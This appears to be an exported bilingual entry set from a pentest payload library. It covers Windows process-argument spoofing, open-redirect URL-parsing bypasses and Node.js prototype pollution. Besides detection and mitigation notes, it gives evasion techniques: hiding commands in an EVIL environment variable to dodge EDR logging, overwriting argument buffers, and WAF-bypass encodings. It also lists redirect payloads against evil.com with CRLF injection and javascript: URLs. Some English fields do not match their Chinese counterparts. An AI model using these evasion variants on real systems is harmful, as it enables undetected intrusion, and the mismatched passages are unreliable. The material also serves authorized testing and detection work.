title.zh: 进程参数多源遥测审计校正命令 2
title.en: Process-Argument Multi-Source Telemetry Audit Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_2 与蓝队日志；成功时变量展开执行，命令行仅见变量名而不见实际命令。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_2 with blue-team logs; the variable expanding and executing while the command line shows only the variable name confirms success.

title.zh: 进程参数多源遥测审计校正命令 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_3 与蓝队日志；成功时输出进程命令行清单，可与内核侧数据对比伪装差异。
description.en: Run in the isolated authorization and correlate PAYLOADER_EVASION_EVASION_ARG_SPOOFING_E_3 with blue-team logs; the command-line listing enabling comparison against kernel-side data confirms success.

analysis.zh: 进程参数多源遥测审计只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Process-Argument Multi-Source Telemetry Audit is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 一次只查询一个实验对象并限制结果数量，不保存凭据、哈希、票据、邮箱正文或无关个人数据。
opsecTips.en: Query one lab object at a time with bounded results and do not retain credentials, hashes, tickets, mailbox content, or unrelated personal data.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: 可变缓冲区覆写规避变体

description.zh: 绕过命令行快照一致性校验：CreateProcess 后进程内覆写参数缓冲区，遥测读到的与执行的不同。成功判据：进程行为与记录命令行不匹配。
description.en: Evades command-line snapshot consistency checks by overwriting the parameter buffer after CreateProcess so telemetry and execution diverge. Success: process behavior mismatches the recorded command line.

title.zh: 环境变量间接传递规避变体

description.zh: 绕过命令行参数扫描：敏感命令藏于环境变量，进程参数仅见变量引用。成功判据：as.log 生成且命令行无明文命令。
description.en: Evades command-line scanning by hiding the sensitive command in an environment variable so process args only show the reference. Success: as.log appears with no plaintext command in the args.

title.zh: 延迟展开变形规避变体

description.zh: 绕过参数全文匹配：延迟展开拼接命令词，快照中无完整命令。成功判据：as2.log 生成。
description.en: Evades full-parameter matching via delayed expansion that assembles command words after the snapshot. Success: as2.log appears.

title.en: Split arguments to fake the command line

description.zh: CreateProcess 时把真实程序放 lpApplicationName、把伪装命令写入 lpCommandLine；进程执行恶意程序而日志记录合法参数。
description.en: In CreateProcess put the real binary in lpApplicationName and the benign text in lpCommandLine; the malicious binary runs while logs record the benign arguments.

attackChain.payload:
# CreateProcess 参数伪装对照（ lpApplicationName 与 lpCommandLine 不一致即遥测告警点）
# lpApplicationName = "C:\Windows\System32\cmd.exe"
# lpCommandLine = "C:\Windows\System32\cmd.exe /c whoami"

title.zh: 环境变量中转隐藏载荷

description.zh: 先把真实命令写入 EVIL 环境变量，再让子进程以命令行字面 %EVIL% 形式启动并在进程内部展开执行；记录的命令行仅见变量名即降低日志与 EDR 可见性。
description.en: Set EVIL to the real command, then launch via cmd /c %EVIL%; the literal command line carries no payload, slipping past another layer of logging.

description.zh: 用 Get-CimInstance 拉取进程 CommandLine 与 ETW 事件对照；两源记录不一致即该盲区可长期复用。
description.en: Pull CommandLine via Get-CimInstance and compare with ETW events; divergent records mark a blind spot for long-term reuse.

overview.zh: 进程参数多源遥测审计覆盖命令行伪装检测场景：针对依赖单一命令行来源的检测逻辑，验证 lpApplicationName 与 lpCommandLine 不一致、环境变量执行等变体能否被识别。验证维度涵盖创建参数不一致执行、变量间接执行与多源命令行比对三类。
overview.en: Process-Argument Multi-Source Telemetry Audit covers command-line masquerading detection: for detection logic relying on a single command-line source, verify whether variants such as lpApplicationName/lpCommandLine inconsistency and environment-variable execution are recognizable. Verification dimensions cover inconsistent creation arguments, indirect variable execution, and multi-source command-line comparison.

vulnerability.zh: 根因是进程的 lpApplicationName 与 lpCommandLine 可分别指定，环境变量展开又发生在 cmd 进程内部，检测若只读取其中一处即被另一处欺骗；内核创建事件、PEB 与 WMI 等多源遥测之间的差异是核心检测信号。
vulnerability.en: The root cause is that lpApplicationName and lpCommandLine are specified independently and environment-variable expansion happens inside the cmd process, so a detection reading only one is deceived by the other; divergence across multi-source telemetry — kernel creation events, PEB, and WMI — is the core detection signal.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 lpApplicationName 指向 cmd.exe 而 lpCommandLine 写入另一条命令创建进程，多源遥测记录出现差异即确认伪装成立；第 2 步用环境变量间接执行使命令行仅见变量名，对比检测可见性差异；第 3 步用 Win32_Process 输出命令行清单，与内核侧数据比对完成伪装识别验证。LAB_* 占位符在全局变量菜单中替换。
exploitation.en: Use in Payload list order: step 1 creates a process with lpApplicationName pointing at cmd.exe while lpCommandLine carries a different command — divergence across telemetry sources confirms the masquerade; step 2 executes indirectly via an environment variable so the command line shows only the variable name, comparing detection visibility; step 3 lists command lines with Win32_Process and compares against kernel-side data to finish validation. Replace LAB_* placeholders via the global variables menu.

mitigation.zh: 检测侧交叉核对 ETW 内核创建事件与 PEB/WMI 命令行快照，对创建参数不一致与可疑变量间接执行告警，并保留原始审计数据防篡改。修复后用第 1、2 步样例回归，伪装变体应触发多源差异告警。
mitigation.en: Cross-check ETW kernel creation events against PEB/WMI command-line snapshots, alert on inconsistent creation arguments and suspicious indirect variable execution, and retain raw audit data against tampering. After the fix, regress with the step 1 and step 2 samples: masquerade variants must trigger multi-source divergence alerts.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: 基础开放重定向目标解析

description.zh: 使用本地 Fixture 和 `.invalid` 保留域名验证绝对 URL、userinfo、协议相对形式、百分号编码与反斜杠规范化后的最终目标。
description.en: Use a local fixture and the reserved .invalid domain to validate final destinations after parsing absolute URLs, userinfo, protocol-relative forms, percent encoding, and backslashes.

prerequisites.zh: 使用 127.0.0.1 重定向 Fixture，并关闭客户端自动跟随以便保存原始 Location。
prerequisites.en: Use the 127.0.0.1 redirect fixture and disable automatic following so the original Location is preserved.

prerequisites.zh: 外部目标统一使用 {ATTACKER_HOST} 占位符，实验内固定替换为 redirect-canary.invalid 保留域；该域名不解析也不承载任何服务。
prerequisites.en: Use only redirect-canary.invalid as the external destination; the test domain does not resolve or host a service.

description.zh: 请求携带外部 next 参数的跳转链接；响应 302 且 Location 与浏览器最终地址落在 next 指定的外部域，即确认开放重定向。
description.en: Request the redirect link with an external next parameter; a 302 whose Location and final browser address land on the external domain confirms an open redirect.

description.zh: 以合法域@外部域形式构造 next；目标被解析为 @ 之后的 host 并完成跳转，即确认 authority 解析绕过。
description.en: Craft next as legit-domain@external-domain; if the target resolves to the host after @ and the redirect fires, authority parsing is bypassed.

explanation.en: Describes how the value segment "attacker.com@target.com" participates in this validation command.

description.zh: 以协议相对 //外部域 构造 next；跳转落在外部域，即确认仅校验路径前缀的实现可被绕过。
description.en: Craft next as a protocol-relative //external-domain; if navigation lands on the external domain, path-prefix-only validation is bypassed.

analysis.zh: 阳性证据是最终解析的 scheme、host 或 port 离开明确允许列表，并由 Location 或浏览器导航确认。参数中出现外域、应用返回重定向状态或日志记录告警都只能作为线索。
analysis.en: Positive evidence is a final parsed scheme, host, or port outside the explicit allowlist, confirmed by Location or browser navigation. An external domain in the parameter, a redirect status, or a log warning is only a lead.

opsecTips.zh: 所有外部目标使用 `.invalid` 保留域名，关闭自动跟随并避免第三方网络流量。
opsecTips.en: Use the reserved .invalid domain for every external destination, disable automatic following, and avoid third-party network traffic.

opsecTips.zh: 每次只改变一个 URL 变量并保存原始字节，防止代理、框架或浏览器二次编码造成误判。
opsecTips.en: Change one URL variable per request and preserve raw bytes to avoid misattributing proxy, framework, or browser re-encoding.

title.en: Validation step 1 for Basic Open-Redirect Destination Parsing

description.zh: 提交 URL 编码与双编码等编码变体；编码后的外部目标仍触发 302 跳转，即确认白名单在解码前匹配。
description.en: Submit encoded and double-encoded variants; if the encoded external target still triggers the 302, the allowlist matches before decoding.

title.en: Validation step 2 for Basic Open-Redirect Destination Parsing

description.zh: 提交反斜杠与 data: 等解析变体；任一变体使浏览器最终落地外部域，即确认跨解析器校验差异可被利用。
description.en: Submit backslash and data: parsing variants; any variant that lands the browser on the external domain confirms exploitable cross-parser differences.

description.zh: 提交协议相对 // 形式目标；跳转落在外部域，即确认路径前缀校验被绕过。
description.en: Submit the protocol-relative // form; if the redirect lands on the external domain, path-prefix validation is bypassed.

description.zh: 提交 %23 与 @ 组合的片段混淆目标；服务端校验取片段前内容而浏览器跳到 @ 之后的 host，即确认片段解析差异可利用。
description.en: Submit the fragment-confused target combining %23 and @; server validation reading pre-fragment content while the browser lands on the post-@ host confirms an exploitable parsing differential.

title.zh: 空字节与特殊字符截断
title.en: Null byte and special character truncation

description.zh: 提交双编码 CRLF 目标；响应头出现注入的 X-Lab-Marker，即确认 CRLF 注入可绕过目标校验。
description.en: Submit the double-encoded CRLF destination; an injected X-Lab-Marker appearing in response headers confirms CRLF injection past destination validation.

syntaxBreakdown.part:
# 空字节截断
https://target.com/redirect?url=https://target.com%00@evil.com
https://target.com/redirect?url=https://evil.com%00.target.com

# 换行符注入
https://target.com/redirect?url=https://evil.com%0d%0aLocation:%20https://evil.com

# Tab/空格混淆
https://target.com/redirect?url=https://evil .com
https://target.com/redirect?url=java%09script:alert(1)
https://target.com/redirect?url=\x09javascript:alert(1)

title.en: Validation step 1 for Percent-Encoded Open-Redirect Bypass

description.zh: 把百分号编码目标逐条提交；解码后仍跳转到外部域，即确认编码规范化绕过。
description.en: Submit each percent-encoded destination; redirects to the external domain after decoding confirm the encoding-normalization bypass.

description.zh: 提交 URL 编码的外部目标；解码后仍发生跳转且落在外部域，即确认编码绕过有效。
description.en: Submit the URL-encoded external destination; if decoding still redirects to the external domain, the encoding bypass works.

description.zh: 提交 @ 形式目标；authority 被解析为 @ 之后的 host 并完成跳转，即确认 userinfo 混淆绕过。
description.en: Submit the @-form destination; if the authority resolves to the host after @ and the redirect completes, userinfo confusion is confirmed.

description.zh: 提交反斜杠分隔的目标；任一解析器接受并跳转，即确认反斜杠规范化差异可利用。
description.en: Submit the backslash-separated destination; acceptance and redirection by any parser confirms exploitable backslash-normalization differences.

explanation.zh: 反斜杠被部分解析器规范化为 /，形成协议相对 URL 绕过 host 校验
explanation.en: The backslash is normalized to / by some parsers, forming a protocol-relative URL that bypasses host validation

description.zh: 使用固定相对路径记录正常状态码与 Location，确认重定向端点的预期行为。
description.en: Use a fixed relative path to record normal status and Location and confirm expected endpoint behavior.

title.en: Submit destination variants one at a time

description.zh: 依次改变 userinfo、协议相对形式、编码和反斜杠，保持端点与身份不变。
description.en: Change userinfo, protocol-relative form, encoding, and backslashes separately while holding endpoint and identity constant.

description.zh: 对照应用日志、Location 与浏览器解析，确认最终 scheme、host 和 port 是否仍受批准。
description.en: Compare application logs, Location, and browser parsing to confirm that final scheme, host, and port remain approved.

description.zh: 修复后重放五个样例，要求外域全部拒绝或转换为批准的同源路径。
description.en: Replay all five samples after remediation and require every external destination to be rejected or mapped to an approved same-origin path.

overview.zh: 该 Payload 覆盖开放重定向的基础目标解析场景，检验跳转端点对 next 参数的绝对 URL、userinfo、协议相对与编码变体的校验是否可靠。验证维度含直接外部跳转、@ 混淆与协议相对斜杠三类样例，对应第 1 至第 3 步。
overview.en: This payload covers basic open-redirect target parsing, testing whether the redirect endpoint reliably validates absolute URLs, userinfo, protocol-relative and encoded variants of the next parameter. Validation covers direct external redirects, userinfo confusion, and protocol-relative slashes, mapped to steps 1 through 3.

vulnerability.zh: 根因在于重定向目标校验基于字符串包含或前缀匹配而非解析后的 host：合法域出现在 userinfo 位置或以双斜杠开头的协议相对 URL 都能伪装为站内目标，最终跳转到外部域。
vulnerability.en: The root cause is validation by substring or prefix matching instead of parsing the host: a legitimate domain in the userinfo position or a protocol-relative URL starting with double slashes masquerades as an in-site target and ends at an external domain.

exploitation.zh: 第 1 步请求携带外部 next 的链接，响应 302 且最终落在外部域即确认开放重定向；第 2 步以合法域@外部域构造 next，authority 落在 @ 后主机即确认 userinfo 绕过；第 3 步以双斜杠外部域提交，跳转落地外部域即确认前缀校验失效。以 Location 与最终地址为判据。占位符在全局变量菜单替换；编码变体参考 wafBypass。
exploitation.en: In step 1, request the link with an external next; a 302 landing externally confirms the open redirect. In step 2, craft next as legitimate-domain-at-external-domain; authority resolving to the post-at host confirms the userinfo bypass. In step 3, submit the double-slash external form; external landing confirms the failed prefix check. Use Location and final address as criteria. Replace placeholders via the global variables menu; see wafBypass for encoding variants.

mitigation.zh: 跳转前解析 URL 取 authority 与预注册域名白名单精确比对，仅允许站内相对路径或白名单目标。修复后重放第 1 至第 3 步，所有外部目标应被拒绝或回退首页。
mitigation.en: Parse the URL before redirecting and match the authority exactly against a pre-registered domain allowlist, permitting only in-site relative paths or allowlisted targets. After the fix, replay steps 1 through 3: every external target should be rejected or fall back to the home page.

review.reason: qa-final-2026-09 内容质量终审文案修复

name.zh: 混合斜杠解析差异重定向

description.zh: 验证应用、代理和浏览器对 /\、连续斜杠及反斜杠的规范化差异是否把看似站内路径解析为外部主机。
description.en: Tests whether applications, proxies, and browsers normalize slash and backslash combinations differently and turn an apparently internal path into an external host.

prerequisites.zh: 应用、代理和浏览器对反斜杠、/\、连续斜杠的 URL 规范化顺序不同，且该值最终进入重定向/导航 Sink。
prerequisites.en: Application, proxy, and browser normalize backslashes, slash-backslash pairs, and repeated slashes differently, and the value reaches a redirect or navigation sink.

prerequisites.zh: 所有 {ATTACKER_HOST} 目标替换为自有空源，逐层记录原始值、代理/框架规范值、Location 和浏览器最终 host，每个变体唯一 token。
prerequisites.en: evil.com is replaced by an owned empty origin, recording raw value, proxy and framework canonical values, Location, and browser final host per unique-token variant.

title.en: Validation step 1 for Backslash URL-Parser Differential Redirect

description.zh: 把混合斜杠目标逐条置于跳转参数；任一变体被解析为外部 authority 并跳转，即确认斜杠解析差异可利用。
description.en: Place each mixed-slash destination into the redirect parameter; any variant parsed as an external authority with a redirect confirms exploitable slash-parsing differences.

analysis.zh: 阳性证据是校验器把变体判为站内路径，而后续层/浏览器把反斜杠规范化为协议相对外部 host 并实际导航到自有源。 假阳性边界：反斜杠字符串回显、浏览器保持站内路径、服务器 404、Location 仍为相对路径、手工改 URL、不同浏览器理论差异或 WAF 放行均不是重定向。
analysis.en: Positive evidence requires validation to classify a variant as an internal path while a later layer or browser canonicalizes backslashes into a scheme-relative external host and navigates to the owned origin. False-positive boundary: Reflected backslashes, an internal browser path, server 404, a still-relative Location, manual URL edits, theoretical cross-browser differences, or WAF allowance does not prove redirect.

opsecTips.zh: 反斜杠差异测试只导航自有空页面一次；出现真实 query/凭据传递、重定向循环、非测试浏览器、公共域或下载时停止。
opsecTips.en: Backslash differential testing navigates once to an owned empty page only; stop on real query or credential transfer, redirect loops, nontest browsers, public origins, or downloads.

opsecTips.zh: 删除测试 URL/token，清理 history/BFCache/代理与 CDN 缓存、目标日志，恢复统一 URL parser 后回归。
opsecTips.en: Delete test URLs and tokens, clear history, BFCache, proxy and CDN caches plus destination logs, restore a unified URL parser, and regress.

description.zh: 反斜杠 %5C 编码传输，规避对连续原始反斜杠的特征；成功判据：跳转至攻击者域。
description.en: Percent-encodes backslashes to evade detection of raw backslash runs. Success: redirect reaches the attacker host.

description.zh: 正反斜杠交替组合超出固定模式覆盖，利用解析器归一化差异；成功判据：任一形态完成外域跳转。
description.en: Alternating forward/back slashes exceed fixed pattern coverage via parser normalization differences. Success: any form completes the cross-domain redirect.

description.zh: 尾部接编码 / 与点，打断以反斜杠结尾的模式匹配；成功判据：跳转发生。
description.en: Appends an encoded slash and dot to break patterns anchored on a backslash ending. Success: the redirect fires.

description.zh: 反斜杠阶梯以 %5C 单/双重编码呈现，规避原始连斜杠特征；成功判据：解码后仍形成 // 等价跳转。
description.en: Encodes the backslash ladder as single/double %5C to evade raw run signatures. Success: post-decode it still forms an equivalent // redirect.

description.zh: 正反斜杠混合阶梯超出固定序列模式，利用归一化折叠；成功判据：任一形态跳转成功。
description.en: Mixed forward/backslash ladders exceed fixed sequence patterns via normalization folding. Success: any form redirects.

description.zh: 阶梯后接编码穿越路径，规避“反斜杠结尾即拦截”的规则；成功判据：跳转并带回调路径。
description.en: Appending an encoded traversal path evades rules blocking backslash endings. Success: the redirect fires with the callback path.

description.zh: 把连续反斜杠目标逐条置于跳转参数；任一变体被解析为外部 authority 并跳转，即确认反斜杠阶梯解析差异。
description.en: Place each consecutive-backslash destination into the redirect parameter; any variant parsed as an external authority with a redirect confirms backslash-ladder parsing differences.

description.zh: 保存正常相对路径在应用解析器、响应 Location 和支持浏览器中的结果。
description.en: Preserve results for a normal relative path in the application parser, response Location, and supported browsers.

description.zh: 回放原始组合并逐层记录 authority、host、path 和最终导航目标的差异。
description.en: Replay the original combinations and record authority, host, path, and final navigation differences at each layer.

description.zh: 采用目标映射或标准解析器后重放，确认站内路径正常且反斜杠外部目标稳定失败。
description.en: Replay after destination mapping or standard parsing to preserve internal paths while consistently rejecting backslash external targets.

overview.zh: 该 Payload 覆盖反斜杠与斜杠的 URL 解析差异场景，检验跳转目标在多层解析下的 authority 判定分歧。验证维度为混合斜杠数量阶梯的跳转变体矩阵，对应第 1 步。
overview.en: This payload covers backslash-versus-slash URL parsing divergence, testing authority-judgment splits for jump targets across parsing layers. Validation is a jump-variant matrix over mixed slash-count ladders, mapped to step 1.

vulnerability.zh: 根因在于校验器与浏览器对反斜杠及连续斜杠的规范化规则不同：看似站内的路径被某一层解析为协议相对目标，最终导航至外部主机。
vulnerability.en: The root cause is validators and browsers normalizing backslashes and consecutive slashes differently: paths that look in-site resolve to protocol-relative targets at some layer, ending navigation at external hosts.

exploitation.zh: 第 1 步按脚本把反斜杠与连续斜杠阶梯变体逐条置于跳转参数提交，记录响应 Location 与浏览器最终地址：任一变体被解析为外部 authority 并完成跳转即确认解析差异可利用。成功判据以最终导航域名为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, place backslash and consecutive-slash ladder variants into the jump parameter one by one per the script, recording response Location and the browser's final address; any variant resolving to an external authority and completing the jump confirms exploitable parsing divergence. Judge success by the final navigation domain. Replace placeholders via the global variables menu.

mitigation.zh: 跳转前按 RFC 解析 authority 并与白名单精确匹配，拒绝含反斜杠与混合斜杠的目标。修复后重放第 1 步矩阵，全部变体应被拒绝或落在站内。
mitigation.en: Parse the authority per RFC before jumping and exact-match against allowlists, rejecting backslash and mixed-slash targets. After the fix, replay the step 1 matrix: every variant should be rejected or stay in-site.

name.zh: URL userinfo/fragment 解析混淆
name.en: URL Userinfo and Fragment Parsing Confusion

description.zh: 使用 @、fragment 和编码井号组合检查安全校验与最终客户端对 URL 主机的识别是否一致。
description.en: Uses userinfo markers, fragments, and encoded hashes to test whether validation and final clients identify the same URL host.

subCategory.zh: 编码与 URL 结构混淆

prerequisites.zh: 使用自有 HTTPS 接收域和真实浏览器，记录服务端 URL parser 的 scheme/host/userinfo/fragment 与最终导航。
prerequisites.en: Use an owned HTTPS recipient and real browser, recording server URL parser scheme, host, userinfo, fragment, and final navigation.

prerequisites.zh: 固定重定向 sink 和允许目标，逐个测试 `@`、`#` 及编码 hash 的方向变体，并保留明确合法/非法 URL 对照。
prerequisites.en: Fix redirect sink and allowed target, test direction variants of @, #, and encoded hash individually, and retain clearly valid and invalid URL controls.

title.en: Validation step 1 for URL Userinfo and Fragment Parsing Confusion

description.zh: 把 userinfo 与 fragment 混淆变体逐条置于绝对 URL；校验与跳转解析的主机不一致，即确认 authority 判定差异。
description.en: Place each userinfo or fragment-confused variant into the absolute URL; validation and redirect resolving different hosts confirms authority-resolution differences.

analysis.zh: 阳性要求服务端校验认为 URL 属于可信 host，而浏览器最终 authority 为受控外域并请求唯一 canary 路径。字符串含 target.com、服务端返回 3xx、浏览器停在错误页、fragment 不发送给服务器、外域无请求、用户主动输入外域或校验已识别 userinfo 均是假阳性。
analysis.en: Positive evidence requires server validation to classify the URL as a trusted host while the browser's final authority is the controlled external domain and requests the unique canary path. target.com text, an HTTP 3xx, browser error page, fragments not sent to servers, no external request, user-entered external navigation, or validation correctly identifying userinfo is a false positive.

opsecTips.zh: 浏览器首次到达受控外域 canary 后停止，不携带 token、Cookie 或构造多跳重定向。
opsecTips.en: Stop after the browser first reaches the controlled external canary; do not carry tokens or cookies or build multihop redirects.

opsecTips.zh: 删除接收日志/DNS 和重定向 fixture，清除浏览器数据，并恢复结构化 URL 解析与精确 host 白名单。
opsecTips.en: Delete recipient logs, DNS, and redirect fixtures, clear browser data, and restore structured URL parsing and exact host allowlisting.

description.zh: @ 编码为 %40，绕过对原始 @ userinfo 分隔的检测而解析器仍按 userinfo 处理；成功判据：跳转至攻击者域。
description.en: Encoding @ as %40 evades raw-userinfo detection while parsers still treat it as a userinfo separator. Success: redirect hits the attacker host.

description.zh: 反斜杠与 @ 组合利用 WHATWG 与 RFC 解析差异，部分栈把反斜杠当斜杠、authority 变更；成功判据：浏览器跳到攻击者域。
description.en: The backslash-@ combo exploits WHATWG vs RFC parsing so some stacks change the authority. Success: the browser lands on the attacker host.

description.zh: 多个 @ 使不同解析器取不同 userinfo/host，绕过“最后一个 @ 前”的固定假设；成功判据：任一主流栈完成外域跳转。
description.en: Multiple @ signs make parsers disagree on userinfo/host boundaries, defeating the last-@ assumption. Success: any major stack completes the redirect.

title.zh: 建立绝对 URL authority 判定基线
title.en: Establish the Absolute-URL Authority Resolution baseline

description.zh: 记录合法目标 URL、明确外部 URL 和无效 URL 的结构化解析结果与最终导航，并保存原始请求、响应与服务端关联标识。
description.en: Record structured parse results and final navigation for a legitimate URL, an explicit external URL, and an invalid URL, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行绝对 URL authority 判定变体
title.en: Execute the Absolute-URL Authority Resolution variants

description.zh: 逐项提交原始 userinfo/fragment 变体，但把外部域替换为自有测试接收端，严格保持其他变量不变并设置停止阈值。
description.en: Submit original userinfo and fragment variants one at a time while replacing the external domain with an owned test receiver, holding all other variables constant and defining a stop threshold.

title.zh: 核验URL userinfo/fragment 解析混淆证据
title.en: Verify evidence for URL Userinfo and Fragment Parsing Confusion

description.zh: 确认服务端允许该值且浏览器最终 authority 为未允许的测试域；同时排除服务端拒绝、浏览器保持可信主机、仅页面文本显示外部域或 DNS 失败。
description.en: Confirm that the server accepts the value and the browser's final authority is the unallowed test domain; also exclude Server rejection, browser retaining the trusted host, external text only, or DNS failure.

overview.zh: 该 Payload 覆盖 userinfo 与 fragment 的 authority 判定混淆场景，检验安全校验与客户端对 URL 主机识别的一致性。验证维度为 @ 位置互换与编码井号组合的变体矩阵，对应第 1 步。
overview.en: This payload covers authority-judgment confusion across userinfo and fragments, testing consistency between security checks and clients on URL host identification. Validation is a variant matrix of at-position swaps and encoded hash combos, mapped to step 1.

vulnerability.zh: 根因在于校验器与浏览器对 userinfo 与片段的边界处理不同：合法域名出现在 @ 前或片段中让目标串看似可信，实际解析主机为攻击者域。
vulnerability.en: The root cause is validators and browsers splitting userinfo and fragment boundaries differently: legitimate domains before the at-sign or inside fragments make targets look trusted while the resolved host is the attacker's.

exploitation.zh: 第 1 步把 userinfo 与 fragment 混淆变体逐条提交跳转端点，记录服务端校验结论与浏览器最终地址：校验层判为可信 host 而浏览器最终 authority 落在 {ATTACKER_HOST} 即确认解析混淆。成功判据以两侧解析结果对照为准。占位符在全局变量菜单替换。
exploitation.en: In step 1, submit double-encoded targets to the jump endpoint one by one per the script, recording decoded shapes in layer logs and the final Location header; external landing after the second decode confirms exploitable layer divergence, contrasted with single encoding to bound decode counts. Judge success by the final navigation address and intermediate logs. Replace placeholders via the global variables menu.

mitigation.zh: 用标准 URL 解析器提取 authority 参与校验并剥离片段，拒绝含 userinfo 的目标。修复后重放第 1 步矩阵，全部变体应按真实主机判定。
mitigation.en: Extract authority with a standards-compliant URL parser for validation, stripping fragments and refusing userinfo-bearing targets. After the fix, replay the step 1 matrix: every variant should be judged on its true host.

name.zh: Node.js 原型链污染输入

description.zh: 覆盖不安全深合并、路径赋值和反序列化对 __proto__、constructor.prototype 等特殊键的处理。
description.en: Covers unsafe deep merge, path assignment, and deserialization of special keys such as __proto__ and constructor.prototype.

subCategory.zh: 服务端 JSON 合并污染

prerequisites.zh: 外部对象进入不安全深合并、路径赋值或反序列化逻辑，且 __proto__ 或 constructor.prototype 键未被 schema/own-property 检查拒绝。
prerequisites.en: An external object reaches unsafe deep merge, path assignment, or deserialization where __proto__ or constructor.prototype keys are not rejected by schema or own-property checks.

prerequisites.zh: 一次性 Node worker 使用唯一不可执行 marker 属性和合并前后原型描述符快照，同时准备普通嵌套键与拒绝特殊键对照。
prerequisites.en: A disposable Node worker uses a unique nonexecutable marker property and prototype-descriptor snapshots before and after merging, with ordinary nested-key and rejected-special-key controls.

description.zh: Prototype Pollution (Node.js)包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：新对象继承注入属性，或 execPath/execArgv 变体使子进程执行指定命令。
description.en: Prototype Pollution (Node.js) contains multiple reproducible input samples; test them individually and record response and log differences. Success check: fresh objects inherit the injected property, or the execPath/execArgv variants make a child process run the given command.

analysis.zh: 阳性证据是可控特殊键使新建无关对象从 Object.prototype 或目标构造器原型继承 marker，并能从具体 merge/assign 调用栈追溯。 假阳性边界：输入对象自身含 admin 属性、JSON.parse 保留 __proto__ 但未合并、只有原对象变化、库显式创建 null prototype、shell 字符串存在或进程未受影响均不是污染。
analysis.en: Positive evidence requires controlled special keys to make a newly created unrelated object inherit the marker from Object.prototype or a target constructor prototype, traced to the specific merge or assignment call. False-positive boundary: An own admin property, JSON.parse preserving __proto__ without a merge, mutation of only the input object, explicit null prototypes, a shell string, or no effect on new objects does not prove pollution.

opsecTips.zh: 在一次性隔离 worker 中先以唯一 marker 确认污染原语，再逐条验证 admin/role/shell/execPath 等 gadget 样例；发现全局授权变化、命令 sink 触发、跨请求持续、依赖异常或 worker 不稳定时立即停止。
opsecTips.en: Prototype-pollution testing writes a unique marker only and never business admin, role, or shell keys; stop on global authorization changes, command sinks, cross-request persistence, dependency anomalies, or worker instability.

opsecTips.zh: 立即销毁污染 worker，删除测试对象/marker，清理模块和应用缓存，重启所有隔离进程并验证新对象原型无该属性。
opsecTips.en: Destroy the polluted worker immediately, delete test objects and markers, clear module and application caches, restart all isolated processes, and verify new-object prototypes lack the property.

description.zh: 绕过仅匹配 __proto__ 键的 WAF 规则：constructor.prototype 等价触达原型。成功判据：目标出现注入的 admin/role 属性。
description.en: Bypasses WAF rules matching only the __proto__ key since constructor.prototype reaches the prototype equivalently. Success: the target exhibits the injected admin/role properties.

description.zh: 绕过 JSON 体中 __proto__ 明文特征：转义在 JSON.parse 后还原。成功判据：还原键触达原型合并。
description.en: Bypasses plaintext __proto__ signatures in the JSON body since escapes resolve after JSON.parse. Success: the resolved key reaches prototype merging.

description.zh: 绕过 JSON 专用检测：表单/点路径语法经 qs 深解析触达原型。成功判据：表单提交同样完成污染。
description.en: Bypasses JSON-only detection since form/dot-path syntax reaches the prototype via qs deep parsing. Success: the form submission pollutes just the same.

description.zh: 绕过 JSON 体 __proto__ 明文特征：转义在解析后还原。成功判据：目标对象出现注入属性。
description.en: Bypasses plaintext __proto__ in the JSON body since escapes resolve after parsing. Success: the target object exhibits injected properties.

description.zh: 绕过 __proto__ 键黑名单：等价路径完成污染。成功判据：原型上出现注入属性。
description.en: Bypasses __proto__ key blacklists via the equivalent path. Success: injected properties appear on the prototype.

description.zh: 把污染键藏进深层嵌套绕过顶层键扫描。成功判据：深合并路径触达原型。
description.en: Hiding the pollution key inside deep nesting bypasses top-level key scanning. Success: the deep merge path reaches the prototype.

title.en: Validation step 1 for JSON Body Prototype Pollution

description.zh: JSON Body注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。命中判据：响应行为随注入属性变化（权限字段生效、新对象继承属性）。
description.en: Run this JSON Body Prototype Pollution validation command in an authorized lab, preserve the output, and compare it with the documented baseline. Success check: behavior changes with the injected property (privilege fields take effect, fresh objects inherit it).

description.zh: 在新进程中创建与请求无关的对象，记录目标属性不存在，并固定应用版本与合并路径。
description.en: Create an object unrelated to the request in a fresh process, record that the target property is absent, and fix the application version and merge path.

description.zh: 使用现有 JSON 集合但只以随机无害值观察合并行为，避免直接把权限变化当作第一证据。
description.en: Use the existing JSON set with a harmless random value to observe merge behavior without treating an authorization change as the first proof.

title.en: Verify inheritance on an independent object

description.zh: 在另一个代码路径创建新对象，确认属性来自原型而不是自身字段，并通过重启判断污染是否为进程级。
description.en: Create a new object on another code path, confirm the property comes from the prototype rather than an own field, and restart to determine process scope.

description.zh: 加入递归键过滤、schema 和自有属性读取后，重复相同输入并确认独立对象不再继承标记。
description.en: Add recursive key filtering, schema validation, and own-property access, then repeat the input and confirm unrelated objects no longer inherit the marker.

overview.zh: Node.js 原型链污染输入针对深合并、路径赋值或反序列化把 __proto__、constructor.prototype 等特殊键写入共享原型的场景。验证多组可复现输入样例对新建对象继承与子进程选项的影响。
overview.en: Node.js prototype-pollution inputs target deep merges, path assignment, or deserialization writing special keys like __proto__ and constructor.prototype into the shared prototype. It validates multiple reproducible input samples for fresh-object inheritance and child-process option impact.

vulnerability.zh: 根因是深合并、克隆、路径设置或查询参数解析逻辑未拒绝 __proto__、prototype 和 constructor 等危险键，并把数据写到共享原型；仅在输入对象自身出现同名字段并不证明污染，必须观察到无关新对象继承该属性。
